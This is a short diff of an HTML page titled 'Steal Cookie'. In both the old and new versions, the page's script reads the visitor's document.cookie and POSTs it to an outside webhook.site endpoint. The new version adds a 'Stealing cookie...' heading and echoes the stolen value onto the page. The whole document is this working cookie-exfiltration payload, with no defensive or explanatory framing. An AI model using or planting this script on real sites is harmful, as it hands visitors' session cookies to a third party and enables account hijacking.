@@ -1,13 +1,19 @@
 <!DOCTYPE html>
 <html>
-<head><title>Steal Cookie</title></head>
-<body>
-  <script>
-    fetch("https://webhook.site/9f55de09-3788-4b74-9f67-8c7bbc6f5626", {
-      method: "POST",
-      body: document.cookie
-    });
-    document.write("✅ Sent: " + document.cookie);
-  </script>
-</body>
+  <head><title>Steal Cookie</title></head>
+  <body>
+    <h2>Stealing cookie...</h2>
+    <script>
+      const cookie = document.cookie;
+
+      // Send to webhook
+      fetch("https://webhook.site/9f55de09-3788-4b74-9f67-8c7bbc6f5626", {
+        method: "POST",
+        body: cookie
+      });
+
+      // Also show it on screen
+      document.body.innerHTML += "<p>✅ Sent: " + cookie + "</p>";
+    </script>
+  </body>
 </html>
